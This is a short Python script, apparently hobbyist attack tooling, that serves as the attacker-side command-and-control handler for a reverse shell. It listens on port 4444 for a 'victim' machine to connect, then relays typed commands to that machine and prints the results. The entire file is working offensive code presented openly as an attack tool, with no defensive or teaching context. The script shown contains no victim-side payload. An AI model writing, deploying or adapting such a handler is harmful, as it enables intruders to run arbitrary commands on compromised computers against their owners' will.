import socket
import os
import time

print("="*60)
print("   REVERSE SHELL C2 HANDLER - ATTACKER SIDE")
print("="*60)

# Create socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Listen on all interfaces, port 4444
listener.bind(("0.0.0.0", 4444))
listener.listen(1)

print("\n[+] C2 Server Started Successfully")
print("[+] Listening on Port: 4444")
print("[+] Waiting for victim to connect...")
print("[+] Press Ctrl+C to stop server\n")

# Accept connection
victim_socket, victim_address = listener.accept()
print(f"\n[✓] VICTIM CONNECTED!")
print(f"[✓] IP Address: {victim_address[0]}")
print(f"[✓] Port: {victim_address[1]}")
print("="*60)
print("[!] You can now execute commands on victim machine")
print("[!] Type 'exit' to close connection")
print("="*60)

# Command loop
while True:
    # Get command from attacker
    command = input("\nC2 Shell> ")
    
    # Send command to victim
    victim_socket.send(command.encode())
    
    # If exit command, break loop
    if command.lower() == "exit":
        print("[+] Closing connection...")
        break
    
    # Get output from victim
    result = victim_socket.recv(8192).decode()
    print(result)

# Close connection
victim_socket.close()
listener.close()
print("[+] C2 Handler Closed Successfully")